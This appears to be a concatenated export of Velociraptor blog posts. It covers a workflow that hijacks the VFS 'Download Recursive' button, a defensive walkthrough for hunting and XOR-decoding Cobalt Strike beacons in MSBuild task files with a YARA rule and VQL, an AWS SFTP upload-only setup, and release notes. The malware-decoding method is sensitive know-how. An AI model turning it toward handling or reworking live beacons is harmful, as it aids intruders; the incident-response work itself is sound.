### Artifact: [`Custom.Server.DispatchUpload`](https://github.com/predictiple/VelociraptorCompetition/blob/main/artifacts/Custom.Server.DispatchUpload.yaml)

The triaging artifacts in the previous step have now looked at the target files in more depth and given some sort of risk-rating or assessment based on the information in (or about) each file.

Similarly to Step 2, the server can now collate that information and conditionally dispatch another artifact to the client. The artifact is almost identical to the one described in Step 2 other than for the fact that it’s now using criticality_score in the decision process instead of magic_id.

![](0MeJqIkpWMmr0fjtY.png)

The client artifact we will dispatch here is `Custom.Server.DispatchUpload`, which is described in the next step.

## Step 5: Send new orders to the client

### Artifact: [`Custom.Client.TriageUpload`](https://github.com/predictiple/VelociraptorCompetition/blob/main/artifacts/Custom.Client.TriageUpload.yaml)

This artifact is a simple one that just uploads the files identified by the previous steps as containing relevant information.

In other words, what we have accomplished is the **preservation of evidence based on the actual evidence contained within the files themselves**. This is a better approach than just uploading everything and *then* checking to see what the files contain.

## Step X: Bonus points: Hijacking the VFS browser upload function

### Artifact: [System.VFS.DownloadFile](https://github.com/predictiple/VelociraptorCompetition/blob/main/artifacts/System.VFS.DownloadFile.yaml)

![](0AjvQfNC5jIycbk5N.png)

Under the hood Velociraptor itself uses many artifacts that contain VQL for performing various functions, including many of the functions exposed via the Velociraptor GUI. The VFS (Virtual File System) browser in the GUI has an associated artifact named System.VFS.DownloadFile ([https://github.com/Velocidex/velociraptor/blob/54d878fd57a9250b44965429750a4d20e7850b3e/artifacts/definitions/System/VFS/DownloadFile.yaml](https://github.com/Velocidex/velociraptor/blob/54d878fd57a9250b44965429750a4d20e7850b3e/artifacts/definitions/System/VFS/DownloadFile.yaml))

This artifact provides 2 functions which are invoked by 2 buttons in the VFS GUI:

* “download_one_file”

* “download_recursive”

We would like to be able to browse around on the client machine and when we find an interesting folder we want to be able to click a button and let Velociraptor do the rest! To do that we are going to have to hijack one of those buttons. The “Download Recursive” button and corresponding VQL artifact’s function seems to be the best match for our purposes since we want to target a folder and do stuff recursively with the files in that folder.

{{% notice note %}}
It sucks that we need to hijack a built-in “system” artifact to do this, and we feel really bad about doing it (well not really), but at present there are no “custom function” buttons available in the VFS browser GUI. So for now we do this with full knowledge that it is frowned upon and that we are subverting functionality which may be needed for other purposes.
{{% /notice %}}

![](0EkAQm0IkMK23HT1I.png)

In the System.VFS.DownloadFile artifact we've replaced the download_recursive function with our own one that runs our Custom.Client.FindByMagics artifact and pass the parameters Path and Accessor to it. With that minimal information the FindByMagics artifact can begin it's work. Thus we have replaced the native function and by extension we have hijacked the "Download Recursive" button in the VFS browser. Neat!

![](0umZkoPpBx_LFI-9W.png)

We also added the 1-hour timeout into the artifact so that it’s behaviour is consistent with the timeout of the Custom.Client.FindByMagics artifact. Finding files can take a long time, so this is just to avoid frustrating timeouts - however it should rarely take anything as long as an hour.

![](0_Sg3JaXOEeWZJCE2.png)

![](0xXQllV14weMpItFW.png)

## Let’s see it all in action!

Starting from the Custom.Client.FindByMagics artifact:

![](0P7T09VWmEbhqsG60.gif)

Starting from the VFS browser:

![](0jRHjFoyYXAAtoPRy.gif)

(p.s. sorry my gif recording software caught some jitter)

## Conclusion

So what we have here is a set of artifacts that work together to implement a simple workflow. We run a single artifact and all we give it is a filesystem path where it should start looking for stuff. With the VFS browser hack we can even simplify that a bit more and reduce it to just browsing around and clicking a button. We can even browse around the Volume Shadow Copies and target these and other sneaky hidden files. Velociraptor then finds relevant stuff and decides what to do with that stuff.

Although this is a simplified example the concepts can be applied to much more creative artifacts in order to produce quite complex workflows. We hope you’ll find this useful and apply your own creativity in creating cleverer workflows that do super-awesome things!

Have fun guys!!!

What do you think of Justin’s submission? Drop your comments, thoughts and questions into the Discord server or by tweeting @velocidex and keep the conversation going!

---END OF FILE---

======
FILE: /content/blog/2021/2021-11-09-vql-data-manipulation/_index.md
======
---
title: "Cobalt Strike payload discovery and data manipulation in VQL"
description: |
  This post walks through discovery of malicious files, then data manipulation and decode in VQL.
tags:
- Detection
- VQL
- Cobalt Strike
date: 2021-11-09T04:54:00Z
author: Matthew Green
weight: 20
---

Velociraptor’s ability for data manipulation is a core platform capability
that drives a lot of the great content we have available in terms of data
parsing for artifacts and live analysis. After a recent engagement with
less common encoded Cobalt Strike beacons, and finding sharable files on
VirusTotal,  I thought it would be a good opportunity to walk through some
workflow around data manipulation with VQL for analysis. In this post I
will walk though some background, collection at scale, and finally talk
about processing target files to extract key indicators.


## Background

The Microsoft Build Engine (MSBuild.exe) is a signed Windows binary that
can  be used to load C# or Visual Basic code via an inline task project
file. Legitimately used in Windows software development, it can handle XML
formatted task files that define requirements for loading and building
Visual Studio configurations. Adversaries can abuse this mechanism for
execution as defence evasion and to bypass application whitelisting -
[ATT&CK T1127](https://attack.mitre.org/techniques/T1127/001/).

In this particular engagement, the Rapid7 MDR/IR team responded to an
intrusion in which during lateral movement, the adversary dropped many
variants of an MSBuild inline task file to several machines and then
executed MSBuild via wmi to load an embedded Cobalt Strike beacon.
Detecting an in memory Cobalt Strike beacon is trivial for active threats
with our process based yara and carving content.

The problem in this case was: how do you discover, then decode these encoded
files on disk quickly to find any additional scope using Velociraptor?



## Collection

First task is discovery and collecting our files in scope from the network.
Typically this task may be slow to deploy or rely on cobbled together
capabilities from other teams. The Velociraptor hunt is an easy button for
this use case.

![Velociraptor GUI : hunt : add hunt](01_new_hunt.png)

Velociraptor has several valuable artifacts for hunting over Windows file
systems with yara: `Windows.Detection.Yara.NTFS` and `Generic.Detection.Yara.Glob`
spring to mind readily.  In this instance I am selecting Yara.NTFS. I have
leveraged this artifact in the field for hunting malware, searching logs or
any other capability where both metadata and content based discovery is desired.

{{% notice tip "Windows.Detection.Yara.NTFS" %}}
* This artifact searches the MFT, returns a list of target files then runs Yara over the target list.
* The artifact leverages `Windows.NTFS.MFT` so similar regex filters can be applied including Path, Size and date.
* The artifact also has an option to search across all attached drives and upload any files with Yara hits.

Some examples of path regex may include:

* Extension at a path: `Windows/System32/.+\\.dll$`
* More wildcards: `Windows/.+/.+\\.dll$`
* Specific file: `Windows/System32/kernel32\.dll$`
* Multiple extensions: `\.(php|aspx|resx|asmx)$`
{{% /notice %}}

![Select artifact : Windows.Detection.Yara.NTFS](02_find_artifact.png)

The file filter: `Windows/Temp/[^/]*\.TMP$` will suffice in this case to target
our adversaries path for payloads before applying our yara rule. Typically when
running discovery like this, an analyst can also apply additional options like
file size or time stamp bounds for use at scale and optimal performance.
The yara rule deployed in this case was simply quick and dirty hex conversion of
text directly from the project file referencing the unique variable setup that
was common across acquired samples.

```yara
rule MSBuild_buff {
   meta:
      description = "Detect unique variable setup MSBuild inline task project file"
      author = "Matt Green - @mgreen27"
      date = "2021-10-22"
   strings:
    // byte[] buff = new byte[]
    $buff = { 62 79 74 65 5b 5d 20 62 75 66 66 20 3d 20 6e 65 77 20 62 79 74 65 5b 5d }

    // byte[] key_code = new byte[]
    $key_code = { 62 79 74 65 5b 5d 20 6b 65 79 5f 63 6f 64 65 20 3d 20 6e 65 77 20 62 79 74 65 5b 5d }

condition:
      any of them
}
```
![Windows.Detection.Yara.NTFS hunt configuration](03_configure_artifact.png)

After launching the hunt, results become available inside the hunt entry on the
Velociraptor server for download or additional analysis.

![Hunt results](04_hunt_results.png)



## Payload decode
The Cobalt Strike payload is a string with represented characters xor encoded
as a hex formatted buffer and key in embedded C Sharp code as seen below.

![MSBuild inline task project file with CobaltStrike payload](05_payload_b.png)

### Enumerate collected files and find location on server
So far we have only collected files that have suspicious content. Now we want
to post process the result and try to extract more information from the payload.

{{% notice tip "Velociraptor notebook" %}}
The Velociraptor notebook is a gui component that lets the user run VQL directly
on the server. In this case we are leveraging the notebook attached to our hunt
to post process results opposed to downloading the files and processing offline.
{{% /notice %}}

Our first step of decode is to examine all the files we collected in the hunt.
The first query enumerates all the individual collections in the hunt, while the
second query retrieves the files collected for each job.

```vql
-- find flow ids for each client
LET hunt_flows = SELECT *, Flow.client_id as ClientId, Flow.session_id as FlowId
FROM hunt_flows(hunt_id='H.C6508PLOOPD2U')

-- extract uploaded files and path on server
Let targets = SELECT  * FROM foreach(row=hunt_flows,
    query={
        SELECT
            file_store(path=vfs_path) as SamplePath,
            file_size as SampleSize
        FROM uploads(client_id=ClientId,flow_id=FlowId)
    })

SELECT * FROM targets
```

![Find the location of all files collected](06_notebook_files.png)


### Extract encoded payload and xor key
For the second step, to extract target bytes we leverage the `parse_records_with_regex()`
plugin to extract the strings of interest (Data and Key) in our target files.
Note: the buffer_size argument allows VQL to examine a larger buffer than the
default size in order to capture the typically very large payloads in these build
files. We have also included a 200 character limitation on the data field initially
as this will improve performance when working on VQL. We have also specified buffer
size to be larger than default and just larger than the biggest payload in scope.


```vql
-- regex to extract Data and Key fields
LET target_regex = 'buff = new byte\\[\\]\\s*{(?P<Data>[^\\n]*)};\\s+byte\\[\\]\\s+key_code = new byte\\[\\]\\s*{(?P<Key>[^\\n]*)};\\n'

SELECT * FROM foreach(row=targets,
    query={
        SELECT
            basename(path=SamplePath) as Sample,
            SampleSize,
            Key, --obtained from regex
            read_file(filename=Data,accessor='data',length=200) as DataExtract -- obtained by regex, only output 200 characters
        FROM parse_records_with_regex(
            file=SamplePath,buffer_size=15000000,
            regex=target_regex)
    })
```


{{% notice tip "Parse records with regex" %}}
`parse_records_with_regex()` is a VQL plugin that parses a file with a set of regexp and yields matches as records. The file is read into a large buffer. Then each regular expression is applied to the buffer, and all matches are emitted as rows.

The regular expressions are specified in the Go syntax. They are expected to contain capture variables to name the matches extracted.

The aim of this plugin is to split the file into records which can be further parsed. For example, if the file consists of multiple records, this plugin can be used to extract each record, while `parse_string_with_regex()` can be used to further split each record into elements. This works better than trying to write a more complex regex which tries to capture a lot of details in one pass.
{{% /notice %}}


![VQL: extract data and keys](07_notebook_regex.png)


### Extract normalisation

The third step adds a custom function for hex normalisation and converts the inline
C Sharp style encoding to a standard hex encoded string which VQL can easily parse.
In this case, the local normalise function will ensure we have  valid 2 character hex.
The `regex_replace()` will strip the leading '0x' from the hex strings and prepare for
xor processing.

```vql
-- regex to extract Data and Key fields
LET target_regex = 'buff = new byte\\[\\]\\s*{(?P<Data>[^\\n]*)};\\s+byte\\[\\]\\s+key_code = new byte\\[\\]\\s*{(?P<Key>[^\\n]*)};\\n'

-- normalise function to fix bad hex strings
LET normalise_hex(value) = regex_replace(source=value,re='0x(.)[,}]',replace='0x0\$1,')

SELECT * FROM foreach(row=targets,
    query={
        SELECT
            basename(path=SamplePath) as Sample,
            SampleSize,
            regex_replace(re="0x|,", replace="", source=normalise_hex(value=Key)) as KeyNormalised,
            regex_replace(re="0x|,", replace="", source=normalise_hex(value=Data)) as DataNormalised
        FROM parse_records_with_regex(
            file=SamplePath,buffer_size=15000000,
            regex=target_regex)
    })
```
![VQL: hex normalisation](08_notebook_normalise.png)


### Extract to bytes

The fourth step converts hex to bytes and validates that the next stage is working. In the example VQL below
we pass the hex text to the `unhex()` function to produce raw bytes for our variables.

```vql
SELECT * FROM foreach(row=targets,
    query={
        SELECT
            basename(path=SamplePath) as Sample,
            SampleSize,
            unhex(string=regex_replace(re="0x|,", replace="", source=normalise_hex(value=Key))) as KeyBytes,
            read_file(filename=
                unhex(string=regex_replace(re="0x|,", replace="", source=normalise_hex(value=Data))),
                    accessor='data',length=200) as DataBytesExtracted
        FROM parse_records_with_regex(
            file=SamplePath,buffer_size=15000000,
            regex=target_regex)
    })
```

![VQL: extract bytes](09_notebook_bytes.png)


### Xor decode

VQL's flexibility comes with its ability to reuse existing artifacts in different ways.
The fifth step is running Velociraptor’s `xor()` function and piping the output into our
the existing `Windows.Carving.CobaltStrike()` configuration decoder.

```vql
-- extract bytes
LET bytes <= SELECT * FROM foreach(row=targets,
    query={
        SELECT
            SamplePath, basename(path=SamplePath) as Sample, SampleSize,
            unhex(string=regex_replace(re="0x|,", replace="", source=normalise_hex(value=Key))) as KeyBytes,
            read_file(filename=
                unhex(string=regex_replace(re="0x|,", replace="", source=normalise_hex(value=Data))),
                    accessor='data') as DataBytes
        FROM parse_records_with_regex(
            file=SamplePath,buffer_size=15000000,
            regex=target_regex)
    })

-- pass bytes to cobalt strike parser and format key indicators im interested in
SELECT *, FROM foreach(row=bytes,query={
    SELECT *,
        basename(path=SamplePath) as Sample,SampleSize
    FROM Artifact.Windows.Carving.CobaltStrike(TargetBytes=xor(key=KeyBytes,string=DataBytes))
})
```

![VQL: parse config](10_notebook_parse.png)

Decoded Cobalt Strike configuration is clearly observed.

![Cobalt strike configuration example](11_notebook_config_example.png)

The smallest file also includes a Cobalt Strike shellcode stager, which I have recently
added to the Velociraptor Cobalt Strike parser.

![Cobalt strike shellcode example](12_notebook_shellcode_example.png)


### Additional analysis

Finally, we may have a desire to extract specific key indicators and compare across
samples. A simple data stack on key indicators of interest.

```vql
-- pass bytes to cobalt strike parser and format key indicators im interested in
LET cobalt = SELECT *, FROM foreach(row=bytes,query={
    SELECT
        basename(path=SamplePath) as Sample,SampleSize,
        Hash as DecodeHash,
        Rule,Offset,Xor,DecodedConfig
    FROM Artifact.Custom.Windows.Carving.CobaltStrike(TargetBytes=xor(key=KeyBytes,string=DataBytes))
})

-- quick data stack on a few things to show sample analysis
SELECT count() as Total,
    if(condition= Xor=~'^0x(2e|69)$', then=DecodedConfig.BeaconType, else= 'Shellcode stager') as Type,
    if(condition= Xor=~'^0x(2e|69)$', then=DecodedConfig.LicenseId, else= DecodedConfig.Licence) as License,
    if(condition= Xor=~'^0x(2e|69)$', then=dict(SpawnTox86=DecodedConfig.SpawnTox86,SpawnTox64=DecodedConfig.SpawnTox64), else= 'N/A') as SpawnTo,
    if(condition= Xor=~'^0x(2e|69)$', then=DecodedConfig.Port, else= 'N/A') as Port,
    if(condition= Xor=~'^0x(2e|69)$', then=DecodedConfig.C2Server, else= DecodedConfig.Server) as Server
FROM cobalt
GROUP BY Type, Licence,SpawnTo,Port,Server
```

![VQL results: key indicators of interest](13_notebook_example.png)


## Conclusions

In this post we showed discovery, then decode of encoded Cobalt Strike beacons on disk.
Velociraptor can read, manipulate and enrich data efficiently across a large network
without the overhead of needing to extract and process manually.

Whilst most traditional workflows concentrate on collection and offline analysis,
Velociraptor notebook also enables data manipulation and flexibility in analysis.
If you would like to try out these features in Velociraptor, It is available on
[GitHub](https://github.com/Velocidex/velociraptor) under an open source license. As
always, please file issues on the bug tracker or ask questions on our mailing list
velociraptor-discuss@googlegroups.com. You can also chat with us directly on discord
at https://www.velocidex.com/discord.


## References
1. [MITRE ATT&CK T1127.001 - Trusted Developer Utilities Proxy Execution: MSBuild](https://attack.mitre.org/techniques/T1127/001/)
2. [MSBuild Inline Task template](https://github.com/3gstudent/msbuild-inline-task)
3. [VirusTotal sample - `I20xQy.TMP`](https://www.virustotal.com/gui/file/cf54b9078d63eaeb0300e70d0ef6cf4d3a4d83842fe08cb951f841549663e1e2)
4. [VirusTotal sample - `CSLHP.TMP`](https://www.virustotal.com/gui/file/52ade62a412fed9425b75610620c85d9c143593cd50c2269066b120ac05dc8c3)
5. [VirusTotal sample - `ddppllkm.TMP`](https://www.virustotal.com/gui/file/b4ede02ea3c198f5e7d3fbab3cadc1266538d23a43a2825ece7d4c75b7208fa9)
6. [VirusTotal sample - `gujf2z0z.0.cs.TMP`](https://www.virustotal.com/gui/file/152722a89fd87ecdf73fd18558622f22f980bddd6928cad31859453d41f7b8dd)
7. [VirusTotal sample - `Ofeq81u.TMP`](https://www.virustotal.com/gui/file/78d2078c4e740aff4a2a289387ba8cfc1de6c02ed48c4c65b53582303192dab2)
8. [VirusTotal sample - `zzyhukwK.TMP`](https://www.virustotal.com/gui/file/507f988ab1f8229e84bb83dcb5a896b1747957b998aad7c7ccdd301096726999)

---END OF FILE---

======
FILE: /content/blog/2021/2021-12-11-sftp-in-aws/_index.md
======
---
title: "SFTP in AWS"
description: |
   Velociraptor can use sftp to securely transfer data to an AWS S3 bucket. However configuring this service securely is not trivial. This post walks the reader through the steps of setting up a secure sftp upload only bucket that can be used with Velociraptor.

tags:
 - AWS
 - Offline Collector

author: "Mike Cohen"
date: 2021-12-20
---

Many people use Velociraptor's [offline collector]({{< ref
"/docs/offline_triage/" >}}) feature to collect any artifacts without
having the Velociraptor client actually installed on the
endpoint. While the offline collector feature is great to
interactively triage a machine, the produced collection zip file is
normally quite large and unwieldy to transfer.

To help with this, Velociraptor offers the option to send the file
back to the cloud via a number of mechanisms, including upload to S3
buckets directly, WebDAV upload and using Secure FTP (sftp).

One of the challenges with automatic uploading to the cloud is
securely configuring the upload mechanism. Since the credentials for
any upload service are embedded inside the collector, it is important
to ensure that these credentials have minimal additional permissions.

For example, when using a cloud bucket to collect triage data from
endpoints, the bucket policy must be configured to allow a service
account full write access. However, using these credentials should not
allow anyone to list existing bucket resources, or to download
critical triage data from other hosts!

I have [previously]({{< ref
"/blog/2019/2019-10-08_triage-with-velociraptor-pt-3-d6f63215f579/"
>}}) described how to use Google cloud's service accounts to upload to
a GCP bucket securely.

In this post I describe how to set up Amazon's SFTP transfer service
to securely allow the Velociraptor collector to upload files without
granting the collector permission to download the files again, delete
them or discover other uploads in the bucket.

I would like to thank Simon Irwin from Rapid7 for his assistance and
guidance with AWS - I am certainly not an expert and needed a lot of
help figuring this process out. This is one of the reasons I wanted to
document the process in order to save others time.

## Overview

The main AWS service I will use is the [AWS Transfer Family](https://docs.aws.amazon.com/transfer/latest/userguide/what-is-aws-transfer-family.html) documented extensively on the AWS documentation site.

In a nutshell, the service requires creating an sftp transfer server
backed by an S3 bucket. The SFTP server does not use real usernames
for authentication, but rather throwaway usernames I create just for
that service.

Each of these throwaway sftp users are given an SSH key pair (public
and private keys) which they use to authenticate with the service. The
private key will be embedded in the Velociraptor collector and allow
the collector to upload to the service. However, by setting up
restrictive policies I can limit the permissions of the sftp user.

## Creating an AWS bucket

I will begin by creating an S3 bucket called `velociraptor-test` that
will contain all the collector files uploaded from the endpoints.

![Creating an S3 bucket](creating_S3_bucket.png)

## AWS Policies

AWS controls access via roles and policies. For this configuration I
will need to create two policies:

1. The first policy I will call `velociraptor-upload-policy` grants
   full access to the AWS transfer service with full use of the
   provided s3 bucket.

2. The second policy I will call `velociraptor-sftp-upload-only`
   policy will apply to the sftp user and only grant upload
   permissions.

### velociraptor-upload-policy

This policy grants full access to the new bucket I created earlier.

```json

{
  "Version": "2012-10-17",
  "Statement": [
  {
    "Effect": "Allow",
    "Action": [
      "s3:PutObject",
      "s3:GetObject",
      "s3:ListBucket",
      "s3:DeleteObject",
      "s3:PutObjectAcl"
    ],
    "Resource": [
       "arn:aws:s3:::velociraptor-test",
       "arn:aws:s3:::velociraptor-test/*"
    ]
  }
 ]
}
```

### velociraptor-sftp-upload-only

This policy only grants upload rights

```json
{
"Version": "2012-10-17",
"Statement": [
  {
    "Sid": "AllowListingOfUserFolder",
    "Action": [
      "s3:ListBucket"
    ],
    "Effect": "Allow",
    "Resource": [
      "arn:aws:s3:::${transfer:HomeBucket}"
     ],
    "Condition": {
      "StringLike": {
          "s3:prefix": [
              "${transfer:HomeFolder}/*",
              "${transfer:HomeFolder}"
          ]
      }
    }
  },
  {
    "Sid": "HomeDirObjectAccess",
    "Effect": "Allow",
    "Action": [
      "s3:PutObject",
      "s3:PutObjectACL"
    ],
    "Resource": "arn:aws:s3:::${transfer:HomeDirectory}*"
  }
]
}
```

{{% notice note %}}

I found that I needed to give the `s3:ListBucket` permission in order
to upload files - this seems a bit strange to me but I could not get
upload to work without this permission. Despite having this
permission, it is still not possible to actually list the files in the
bucket anyway.

{{% /notice %}}

## AWS Roles

An AWS role is a set of policies that applies to a particular
service. In this case I will create a new role that allows uploading
to the s3 bucket I created. Search for the [IAM
screen](https://console.aws.amazon.com/iamv2/home#/roles) in the AWS
console and select "Create a new role".

In the first step, the UI asks us to associate the role with a
service, Select the `Transfer` as the service.

![Creating a new role](create_role_1.png)

Next associate the role with the `velociraptor-upload-policy`
policy. I will name the role `velociraptor-upload-role`.

![Creating a new role - associating with policy](create_role_2.png)

## Creating the SFTP server

Now I need to create an sftp server in the Transfer service. Search
for the [AWS Transfer
Family](https://us-east-2.console.aws.amazon.com/transfer/home) screen
and select "Create Server". I will choose this to be an SFTP server.

![Creating the sftp server](creating_sftp_server.png)

The identity provider is "Service managed" - this means I will manage
the sftp users with throwaway ssh keys.

![Creating the sftp server - Identity Providers](sftp_server_2.png)

Finally I will choose S3 to be our storage backend

![Creating the sftp server - Backend storage](sftp_server_3.png)

Once the server is created, the AWS console will remind us that no
users are added to the service yet. This will be our next task...

![Creating the sftp server - Success!](create_sftp_server_final.png)

## Adding SFTP users to the sftp server.

Our ultimate goal is to create throw-away sftp users which can
authenticate to the service with an SSH key pair and upload triage
files.

I will now create an SSH key pair on my machine - this will contain a
private key and a public key (Note: do not protect these keys with a
passphrase):

![Generating SSH key pair for the new sftp user](generating_keys.png)

In the AWS console I select the new server and click on "Add user" to
add a new user.

![Adding a new SFTP user](adding_user.png)

I will add the `velociraptor-upload-role` role I created earlier to
this sftp user, allowing the user to interact with the s3 bucket.

I will now also add a `scope down policy` to further restrict the
access this user has to upload only by selecting the
`velociraptor-sftp-upload-only` policy.

Next I will add the user's public key to the AWS console's
configuration by simply pasting the public key I generated earlier.

![Adding a new SFTP user's public keys](adding_public_key_to_user.png)

Finally I create the new user with the name `velouploader`

{{% notice tip "Creating users with different access" %}}

In our example I created a user with an upload only policy that could
not read any of the files in the bucket. However, you can also create
a user with full access to the bucket by removing the scope down policy
or apply a different policy per user.

This is convenient to allow the investigator the ability to download
the collected files by creating a separate sftp user for them without
a scope-down policy.

{{% /notice %}}

## Testing access controls

It is imperative to ensure that access controls are working the way
they are supposed to! Therefore I will now test my setup using the
built in sftp client in my operating system (I can find the endpoint's
public DNS name using the AWS console).

```sh
sftp -i sftpuser.key velouploader@s-9d35031a046643d88.server.transfer.us-east-2.amazonaws.com
```

![Testing ACLs](testing_permissions.png)

At first I upload a small file and confirm it works as expected. Then
I try to list the directory, and read the file out again - both
attempts fail due to the scope down policy.

Finally attempting to overwrite the old file by re-uploading the same
file again, also fails.

## Creating an SFTP Offline Collector

I am now ready to create our offline collectors. I will login to
Velociraptor's web UI and navigate to `Server Artifacts` screen. Once
there I click the `Build Offline Collector` button. For this example,
I will create a collector using the `Windows.KapeFiles.Targets`
artifact and just collect the `$MFT` file.

![Creating an offline collector](kapefiles_1.png)

Now I will configure the collector to use the SFTP upload method,
giving the username I created earlier and pasting the private key I
generated.

![Configuring the offline collector for SFTP uploads](kapefiles_2.png)

I selected the collection method to SFTP which changes the form to
allow for more parameters to be specified:

* The Private key is the file I generated earlier with `ssh-keygen` - I will just paste the file content into this form.
* The user is the sftp user that Velociraptor will log in as.
* The Endpoint is the DNS name of the sftp server I created followed
  by a colon and the port number (usually port 22).

Once the collector is created I am able to run it on a test system.

![Running the collector to collect the MFT](kapefiles_3.png)

As can be seen the upload is mostly fine except there are some
features that are not possible due to the restricted
permissions. Although, the log file shows a failure the file did
successfully upload as can be confirmed in the bucket view.

![Verifying files uploaded in the S3 bucket](success.png)

# Conclusions

In this post I examined how to configure a secure SFTP upload service
in AWS that can safely receive triage data from the Velociraptor
offline collector.

The sftp uploading functionality is actually implemented by the
`upload_sftp()` plugin [documented here]({{< ref
"/vql_reference/other/upload_sftp" >}}). This means that you can use
this functionality in any VQL query at all - either on the client side
or on the server side.

For example it is possible to automatically back up server side hunts
or collections to the SFTP bucket.

---END OF FILE---

======
FILE: /content/blog/2021/2021-09-07-release-notes-0.6.1/_index.md
======
---
title: "Velociraptor 0.6.1 Release"
description: |
    Our latest Velociraptor release contains many new features and bug fixes. This post outlines some of the more interesting changes.

tags:
 - Release

author: "Mike Cohen"
date: 2021-09-06
---

I am very excited to announce the latest Velociraptor release
0.6.1. This release has been in the making for a few months now and
has a lot of new features. I wanted to take some time to tell you all
about it in our blog so I can show some of the new screenshots in more
detail.

## GUI Visible changes

### Most Recently Used

One of my favorite new features is the new `Most Recently Used` (MRU)
list in the GUI. Typically, a Velociraptor deployment may contain many
thousands of clients, but an investigator typically only interacts
with a few relevant hosts. While you could always search for the hosts
you are interested in, Velociraptor now keeps a most recently used
list in each user's profile, making it easy to go back to a host under
investigation.

![Most recently used clients](mru.png)

You don't have to do anything to get hosts added to the MRU list,
simply search for them normally and select the client to interact
with. The MRU list is sorted in most recent order so it should always
contain relevant hosts.

{{% notice note %}}

Although it might appear by the search term, that you can view other
user's most recently used list this is not the case - each user has
their own list of hosts. The username after the `recent:` is currently
ignored.

{{% /notice %}}


### Free disk space

Many users asked to be able to see the free disk space available in
the dashboard. This is useful to keep an eye during investigations. If
the disk fills up during a large hunt, the client connections will
fail to upload data. Since Velociraptor does not know which specific
filesystem contains your file store, it just shows the total disk
space in all mounted filesystems.

![Free disk space](df.png)


### Quarantine hosts

Velociraptor allows users to quarantine hosts using the
`Windows.Remediation.Quarantine` artifact. This artifact updates the
client's firewall rules so it can only communicate with the
Velociraptor server, and some limited exceptions. When a host is
quarantined, no network connections are successful, but the
investigator can still communicate with the host using Velociraptor.

This feature is useful in cases when time is of the essence and it
made sense to expose the feature right in the GUI. From the host overview screen, simply click "Quarantine this host":

![Host overview page](quarantine.png)

You may also add a message for the logged in user

![Quarantine a host](quarantine-1.png)

At this point the machine is quarantined. It gains a label of
Quarantine which indicates to the system that the client is
quarantined.

![A host is quarantined](quarantine-2.png)

{{% notice note "How is quarantine status managed?" %}}

Velociraptor uses labels to place host into `Label Groups`. This is
used to control the types of monitoring artifacts that are running on
the client. It is actually the `Quarantine` label that makes the host
quarantine itself because the `Windows.Remediation.QuarantineMonitor`
artifact is assigned to the Quarantine label group.

The host will continuously check that it is quarantined as long as the
label is set. This means the quarantine status also survives a reboot!

To remove the host from the Quarantine group, simply remove the label
or click the "Unquarantine Host" button. This will immediately release
the host from the quarantine.

{{% /notice %}}

### Notebook full screen

Velociraptor Notebooks have always been the best way for running and
exploring VQL queries. The notebooks are a collaborative shared
document, allowing a group of investigators to share their work and
analysis.

The new full screen mode allows an uninterrupted view of the notebook
as a shared document. Other GUI elements are hidden and the notebook
takes on full screen.

![Switch to full screen notebook](full-screen.png)

You can switch back from full screen mode by simply clicking the button.

![Full screen notebook](full-screen-back.png)

Note that the URL contains the full screen mode so you can share a
notebook URL with your team already in full screen.

### Favorite collections

If you are like me and often use the same combination of artifacts
with similar parameters, but are just too lazy to create a custom
artifact that combines them all, you might enjoy the latest `Favorite`
feature. Simply click the `Save Favorite` button when a collection is
selected.

![Saving a favorite collection](favorite-1.png)

This will save the specific combination of artifacts to collect as
well as their parameters used in the previous collection under a name.

![Saving a favorite collection](favorite-2.png)

Now when we create a new collection, we can retrieve the favorite
collection by name

![Retrieving a favorite collection](favorite-3.png)

{{% notice note "How are favorites managed?" %}}

Favorites are currently stored in the GUI user's profiles so each user
can maintain their own list of favorites. However you can save a
favorite into your own profile using the
[favorite_save](/vql_reference/server/#favorites_save) VQL function,
so a team may create a set of common favorites using a SERVER VQL
artifact.

{{% /notice %}}

### Event Monitoring tables

Velociraptor's `CLIENT_EVENT` artifacts run an event query on the
client and stream the results back to the server. This can be used to
create sophisticated monitoring rules on the endpoint.

In the latest release these events are now indexed by time which
allows for a much more flexible UI experience.

You can view the results from the client's monitoring artifacts by
clicking the `Client Events` screen and selecting the specific event
artifact you want to see.

![Client Event Monitoring view](event-monitoring.png)

The view is split into two halves. The top half is the timeline view
while the bottom half is the table view. The events can be viewed in
the table, while the timeline view provides a quick way to navigate
different time ranges.

You can see the timeline view is split into three rows:

1. `Table View` visualizes the time range visible in the table currently.
2. `Available` shows the days which have any events in them.
3. `Logs` visualizes the days that have any logs in them (You can view query logs by selecting the `Logs` pull down on the top right).

In order to keep the table brief the timestamps are abbreviated - you
can hover the mouse over those to get the full timestamp. Usually the
exact timestamp in the table is not important as we can see a
visualization of the time range in the timeline above.

You can zoom in and out of the visible time ranges using `Ctrl-Mouse
Wheel` or by clicking the timeline itself.

![Interacting with the timeline](event-monitoring-1.png)

By clicking the tool bar it is possible to page through the table to
view visible events. If you need to export the data, simply click the
`Export` button and select either JSON or CSV format. The export
functionality applies to the visible time range so you can finely tune
which events should be exported (simply zoom the visible range in or
out).

### Timelines

One of the most exciting new features in 0.6.1 is the new built in
timeline functionality. What is a timeline? It is a way to visualize
time based rows from multiple sources. The main concepts to understand
are the `Super Timeline` and the `Timeline`.

A super timeline is a grouping of several timelines together (you can
see them on the same timeline, turn each on or off etc). You can add
child timelines to a super-timeline to be able to compare them
together by seeing their separate events together.

A timeline is just a series of rows keyed on a time column - the rows
can be anything at all, as long as a single column is specified as the
time column and it is sorted by time order.

It is even possible (and necessary) to add the same rows multiple
times to each super timeline, each time having a different key column.

#### Adding timelines

The first step is to view a table in a notebook - any table generated
using any query. In the example below, I collected the MFT then post
processed it by filtering it. Once I can see a table with some
results in it, I can add the table to the super timeline.

In this example I just collected the MFT from the client. The full MFT
has about 380k rows, but in practice I might be able to filter it down
by date range or file type so the total size of the table is not too
large.

![Post Processing results from a collection](timeline-1.png)

Next I can add the table to the Super Timeline by generating a
timeline from it. I simply click the `timeline` icon at the tool bar
of each table. Velociraptor will then present the timeline dialog.

![Importing a table into the timeline](timeline-2.png)

When adding a timeline to a super timeline, I need to specify the
Supertimeline's name (If there is no super timeline yet, I can create
a new one). Then I can specify the child timeline's name and a time
column to use as the index.

![Adding timeline details](timeline-3.png)

In this case I will add the Created times from the MFT to the timeline
`MFT Analysis`. Velociraptor will sort the table on the Created Time and will add the timeline to the super timeline.

Since I do not have a Super Timeline yet, I can create a new one by
starting to type in the box. Later I can add other timelines from any
tables to the same supertimeline.

![](timeline-4.png)

#### Viewing timelines

Once this is done, nothing appears to have happened! But really the
supertimeline is added to the notebook. We just need to view it.

